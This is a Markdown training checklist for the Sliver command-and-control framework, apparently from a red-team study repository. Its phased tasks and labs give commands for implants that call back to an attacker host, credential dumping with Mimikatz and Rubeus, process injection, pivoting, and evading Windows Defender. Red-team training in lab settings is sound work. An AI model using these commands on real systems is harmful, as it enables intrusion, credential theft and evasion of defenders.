# 🐍 Sliver: Complete Mastery Checklist

> **What is Sliver?** Sliver is a modern, open-source Command & Control (C2) framework developed by BishopFox. It generates cross-platform implants (Linux, Windows, macOS) that connect back to a Sliver server, providing operators with persistent shell access, file operations, process injection, and post-exploitation capabilities — with multiple communication channels (mTLS, WireGuard, HTTP/S, DNS). It is a legitimate red team alternative to Cobalt Strike.
>
> **Why does it exist?** Commercial C2 platforms like Cobalt Strike cost thousands of dollars and are heavily signatured by AV/EDR. Sliver provides a capable, actively maintained, open-source alternative with modern features: multiple protocol support, in-memory execution, post-exploitation modules (SOCKS pivoting, port forwarding, process hollowing), and a built-in armory of extensions.
>
> **When to use it:** Red team engagements requiring persistent, multi-session command and control. Simulating advanced threat actor behavior. When you need capabilities beyond a basic reverse shell (pivoting, evasion, persistence). Long-term access scenarios.
>
> **When to avoid it:** Simple CTFs (netcat reverse shell is enough). When a single command is needed. When the engagement scope doesn't permit C2 infrastructure.
>
> **What mastering Sliver unlocks:** Full C2 framework operation. Multi-session management. In-memory implant deployment. Advanced post-exploitation. Understanding of C2 infrastructure design — foundational for advanced red team and threat simulation.

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 5 | 2–3 hours |
| 2 | Server Setup | 4 | 2–3 hours |
| 3 | Implant Generation | 5 | 3–4 hours |
| 4 | Session Management | 4 | 2–3 hours |
| 5 | Post-Exploitation | 5 | 4–6 hours |
| 6 | Evasion | 3 | 3–4 hours |
| 7 | Practical Labs | 4 | 5–8 hours |
| 8 | Mastery Challenges | 3 | 3–5 hours |
| | **Total** | **33** | **~24–36 hours** |

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — C2 Framework Concepts

- [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **C2** | Command & Control. Infrastructure for managing compromised endpoints (implants/beacons). Operator sends commands → implant executes → results returned. |
| **Implant/Beacon** | Executable that runs on the compromised host. Calls back to the C2 server on a schedule (beacon) or maintains persistent connection. |
| **Listener** | C2 server-side component waiting for implant callbacks. Protocol-specific. |
| **Operator** | Person controlling the C2. Issues commands via C2 console. |
| **Session** | Active connection between C2 and an implant. Multiple sessions = access to multiple machines. |

---

### Task 1.2 — Sliver vs. Other C2 Frameworks

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Cobalt Strike** | Commercial ($6k+/year). Most widely used in enterprise red teams. Heavily signatured but has the richest feature set and BOF ecosystem. |
| **Metasploit** | Free. Great for exploitation and simple post-exploitation. Less suited for long-term persistent operations. |
| **Havoc** | Open source. More modern architecture. Less mature than Sliver. |
| **Sliver** | Open source. Actively maintained by BishopFox. Go-based implants. Multi-protocol. Armory system. Best open-source C2 for serious red team work. |

---

### Task 1.3 — Sliver Communication Protocols

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **mTLS** | Mutual TLS. Bidirectional certificate authentication. Most reliable. High performance. Default for lab use. |
| **WireGuard** | VPN tunnel. Encrypted. Good for stealth. Requires WireGuard on server. |
| **HTTP/S** | Web-based C2. Blends with legitimate web traffic. Configurable headers, URIs, jitter. Best for evasion against network monitoring. |
| **DNS** | C2 over DNS queries. Very stealthy — DNS often allowed through firewalls. Slow. For highly restricted egress scenarios. |

---

### Task 1.4 — Beacon vs. Session

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Session** | Implant maintains persistent, interactive connection. Commands execute immediately. High network visibility. Use in labs and when speed matters. |
| **Beacon** | Implant sleeps, wakes up on a schedule, checks in, executes queued commands, sleeps again. Lower network footprint. Harder to detect. Use in real red team operations. |
| **Jitter** | Randomizes beacon timing: `sleep 60s/20%` → wakes up between 48–72 seconds. Defeats timing-based behavioral detection. |

---

### Task 1.5 — Sliver Architecture

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Server** | Single binary. Listens for implant callbacks and operator connections. |
| **Implants** | Generated by server. Cross-platform Go binaries. Customizable (shellcode, PE, dylib, service). |
| **Console** | Sliver client connects to server. Operators issue commands. Multi-operator supported. |
| **Armory** | Built-in package manager for Sliver extensions (BOF files, tools). |

---

# PHASE 2: SERVER SETUP

---

### Task 2.1 — Installation

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Download** | `github.com/BishopFox/sliver/releases` — download `sliver-server` and `sliver-client` for your platform. |
| **Linux** | `chmod +x sliver-server; sudo ./sliver-server` — starts server and downloads dependencies on first run. |
| **Kali** | `apt install sliver` (if available) or manual. |
| **First Run** | Server generates operator configs and certificates. Creates `~/.sliver/` directory. |

---

### Task 2.2 — Starting Listeners

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **mTLS Listener** | `mtls` — interactive wizard. Or: `mtls --lhost 0.0.0.0 --lport 443`. |
| **HTTP Listener** | `http --lhost 0.0.0.0 --lport 80`. |
| **HTTPS Listener** | `https --lhost 0.0.0.0 --lport 443 --domain your.domain.com`. |
| **DNS Listener** | `dns --domains c2.yourdomain.com` — requires DNS A record pointing to server. |
| **List Listeners** | `jobs` — show all running listeners. `jobs -k 1` — kill listener job 1. |

---

### Task 2.3 — Client Connection

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Local** | Run `./sliver-server` — built-in console. Or run `./sliver-client` on same machine. |
| **Remote** | `sliver-server operator --name operator1 --lhost server_ip --save operator1.cfg`. `sliver-client import operator1.cfg`. `sliver-client`. |
| **Multi-operator** | Multiple operators can connect to the same server simultaneously. Shared session visibility. |

---

### Task 2.4 — Multiplayer Mode

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Enable** | `multiplayer` command in server console. |
| **Create Operator** | `new-operator --name red_team_1 --lhost server_ip` → generates operator config. |
| **Use** | Operator imports config → connects to server → sees all sessions. Full team C2 operations. |

---

# PHASE 3: IMPLANT GENERATION

---

### Task 3.1 — Generate Session Implant

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Windows exe** | `generate --mtls attacker_ip:443 --os windows --arch amd64 --format exe --save /tmp/`. |
| **Linux elf** | `generate --mtls attacker_ip:443 --os linux --arch amd64 --format elf`. |
| **macOS** | `generate --mtls attacker_ip:443 --os darwin --arch arm64 --format macho`. |

---

### Task 3.2 — Generate Beacon Implant

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | `generate beacon --mtls attacker_ip:443 --os windows --arch amd64 --sleep 60 --jitter 20 --format exe`. |
| **Sleep** | `--sleep 60` — beacon interval in seconds. |
| **Jitter** | `--jitter 20` — ±20% randomization on sleep interval. |
| **Protocol** | `--http` or `--https` instead of `--mtls` for web-based C2. |

---

### Task 3.3 — Shellcode Format

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | `generate --mtls attacker_ip:443 --os windows --arch amd64 --format shellcode`. |
| **Use** | Inject shellcode into a process. Use with a shellcode injector to run in-memory. Never touches disk as an EXE. Better AV evasion. |

---

### Task 3.4 — Profile System

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Create Profile** | `profiles new --mtls attacker_ip:443 --os windows --arch amd64 --format exe my_profile`. |
| **Generate from Profile** | `profiles generate my_profile --save /tmp/`. |
| **Value** | Save common generation options. Quickly regenerate implants without re-entering all flags. |

---

### Task 3.5 — Canary Domains

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Concept** | Sliver embeds canary domains in implants — unique domains that are queried when implants are detonated in sandboxes. Sliver monitors these → alerts operator when implant is being analyzed. |
| **Add** | `--canary yourdomain.com` during generation. |
| **Monitor** | `canaries` in Sliver console — shows any triggered canaries. |

---

# PHASE 4: SESSION MANAGEMENT

---

### Task 4.1 — Viewing and Using Sessions

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **List** | `sessions` — all active sessions. Shows ID, name, OS, hostname, user, remote IP. |
| **Interact** | `use <session_id>` or `sessions -i <id>`. Opens interactive shell with that implant. |
| **Background** | `background` — return to main console. Session stays active. |

---

### Task 4.2 — Basic Commands

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Shell** | `shell` — interactive OS shell. |
| **Execute** | `execute -o whoami` — run command and show output. |
| **Upload/Download** | `upload local_file /remote/path`. `download /remote/file local_path`. |
| **Ls/Cd** | `ls /path`, `cd /dir` — browse filesystem. |
| **Ps** | `ps` — list running processes. |
| **Netstat** | `netstat` — network connections on the target. |

---

### Task 4.3 — File Operations

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Cat** | `cat /etc/passwd` — read file content. |
| **Mkdir** | `mkdir /path/new_dir`. |
| **Rm** | `rm /path/file` — delete file. |
| **Chmod** | `chmod 755 /path/file` (Linux). |

---

### Task 4.4 — Beacon Task Queue

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Queue** | Interact with beacon: `use <beacon_id>`. Run commands — they queue. Beacon checks in next sleep cycle → executes → returns output. |
| **View Tasks** | `tasks` — show queued and completed tasks. |
| **Results** | `tasks fetch <task_id>` — retrieve results of a specific task. |

---

# PHASE 5: POST-EXPLOITATION

---

### Task 5.1 — SOCKS Proxy via Sliver

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Start** | In session: `socks5 start --host 127.0.0.1 --port 1080`. |
| **Use** | `proxychains nmap -sT 10.10.0.0/24` — route through the implant's SOCKS proxy. Or configure Burp to use `127.0.0.1:1080`. |
| **vs. Ligolo** | Ligolo-ng is faster and more transparent. Sliver's SOCKS is convenient when Ligolo isn't deployed. |

---

### Task 5.2 — Port Forwarding

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Forward** | `portfwd add --remote 10.10.0.100:3389 --local 127.0.0.1:13389` — forward local port to remote target via implant. |
| **Use** | `xfreerdp /v:127.0.0.1:13389` — RDP to internal host via Sliver port forward. |

---

### Task 5.3 — Process Injection

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Migrate** | `migrate --pid <target_pid>` — inject implant into another process. Useful for: moving into a more stable process, privilege escalation via privileged process. |
| **Execute-Assembly** | `execute-assembly /path/to/assembly.exe args` — run a .NET assembly in-memory. No disk write. |
| **Inject** | `inject --pid <pid> --shellcode shellcode.bin` — inject raw shellcode into a process. |

---

### Task 5.4 — Armory Extensions

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Armory** | `armory` — Sliver's package manager. Lists available extensions. |
| **Install** | `armory install rubeus` — install Rubeus (Kerberos attacks). `armory install sharpup` — install SharpUp (privilege escalation). `armory install seatbelt` — install Seatbelt (enumeration). |
| **Use** | `rubeus kerberoast /outfile:hashes.txt` — runs Rubeus in-memory via Sliver. |

---

### Task 5.5 — Credential Access

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Hashdump** | `hashdump` — dump SAM/NTLM hashes (requires elevated session). |
| **Mimikatz** | Via armory: `sharp-mimi sekurlsa::logonpasswords` — dump credentials from LSASS. |
| **Token** | `impersonate <username>` — impersonate a logged-in user's token. `rev2self` — revert token. `getuid` — show current token. |

---

# PHASE 6: EVASION

---

### Task 6.1 — HTTPS C2 Profile

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **C2 Profile** | HTTP/S listeners support C2 profiles — customize headers, URI patterns, cookies, user-agents to mimic legitimate traffic. |
| **Config** | `https --domain yourdomain.com --website /path/to/website` — serve a legitimate-looking website on the same port. C2 traffic blends with web traffic. |
| **Headers** | Customize request/response headers to match common CDN or SaaS patterns. |

---

### Task 6.2 — Sleep Obfuscation

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Concept** | While beacon sleeps, encrypt the implant in memory (EKKO, Foliage, etc.). Defeats memory scanning during sleep period. |
| **Sliver** | `--obfuscate` flag during generation adds some code obfuscation. Full sleep encryption is an ongoing development area. |

---

### Task 6.3 — Avoiding Defender

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Compile-time** | Sliver implants are Go binaries — Defender knows the default Sliver signatures. Rebuild with modified strings. |
| **Shellcode + Injector** | Generate shellcode → wrap in a custom injector (not Sliver's default loader). Much less detected. |
| **Garble** | Compile with `garble` (Go obfuscator): removes symbol names, randomizes identifiers. `garble build -literals ...`. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — First Session

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | Set up Sliver server on Kali. Start mTLS listener. Generate Windows implant. Execute on Windows VM. Session connects. Use basic commands: `whoami`, `ls`, `ps`. Upload a file. Download a file. |
| **Success Criteria** | Session established. Basic commands executed. File transfer working. |

---

### Lab 7.2 — Beacon Operation

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | Generate a beacon with 30s sleep / 20% jitter. Execute on Windows VM. Queue 5 different commands. Wait for beacon to check in. Retrieve all results. Compare beacon vs. session interactivity. |
| **Success Criteria** | Beacon operational. All queued commands completed. Beacon vs. session trade-offs documented. |

---

### Lab 7.3 — Post-Exploitation Chain

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | Compromise a Windows machine via an exploit. Get initial Sliver session as low-priv user. Run Seatbelt for enumeration. Find privilege escalation path. Exploit it. Get SYSTEM session. Dump credentials. Pivot to second machine. |
| **Success Criteria** | SYSTEM achieved. Credentials dumped. Second machine accessible. |

---

### Lab 7.4 — HTTP/S Listener with C2 Profile

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 45 min

| **Scenario** | Set up an HTTPS listener with a custom C2 profile mimicking Microsoft Teams traffic. Generate beacon using HTTPS. Verify that the beacon traffic looks like MS Teams traffic in Wireshark. |
| **Success Criteria** | Beacon operational via HTTPS. Traffic pattern documented. Wireshark capture shows convincing disguise. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Full Red Team Simulation

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 120 min

| **Scenario** | Simulate a full red team engagement in a lab AD environment. Initial access via phishing (malicious doc). Sliver beacon as initial C2. Enumerate domain. Lateral move. Escalate to DA. Maintain persistent access. All via Sliver. |
| **Success Criteria** | DA achieved. Persistence established. Full attack timeline documented. |

---

### Challenge 8.2 — Evade Defender

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 90 min

| **Scenario** | Windows machine with Defender enabled. Default Sliver implant gets caught. Modify implant (garble + custom loader). Get beacon running without Defender quarantine. |
| **Success Criteria** | Beacon operational with Defender enabled. Evasion technique documented. |

---

### Challenge 8.3 — Multi-Operator Scenario

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | Set up Sliver in multiplayer mode. Two operators connect. Operator 1 establishes session. Operator 2 takes over. Both interact with the same session without losing access. |
| **Success Criteria** | Multi-operator setup working. Session sharing demonstrated. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can install, configure, and start Sliver server | ☐ |
| Can start mTLS, HTTP/S, and DNS listeners | ☐ |
| Can generate session and beacon implants for Windows and Linux | ☐ |
| Can interact with sessions and execute commands | ☐ |
| Can use the beacon task queue and retrieve results | ☐ |
| Can set up SOCKS proxy and port forwarding through Sliver | ☐ |
| Can install and use Armory extensions (Rubeus, Seatbelt) | ☐ |
| Understands beacon sleep, jitter, and evasion concepts | ☐ |
| Can dump credentials via Sliver | ☐ |
| Understands the difference between Sliver and Cobalt Strike | ☐ |

---

## 🎯 Interview Questions

1. What is a C2 framework and how does Sliver differ from a simple reverse shell?
2. What is the difference between a Sliver session and a beacon?
3. What is jitter and why is it important for beacon operations?
4. How does the Sliver Armory work and what does it allow you to run?
5. How do you set up a SOCKS proxy through a Sliver session?
6. What is execute-assembly and why is in-memory execution preferred?
7. How does HTTPS-based C2 help evade network monitoring?
8. How would you avoid AV detection of a default Sliver implant?
9. What is a Sliver canary domain and what does it detect?
10. How does Sliver compare to Cobalt Strike and when would you choose each?
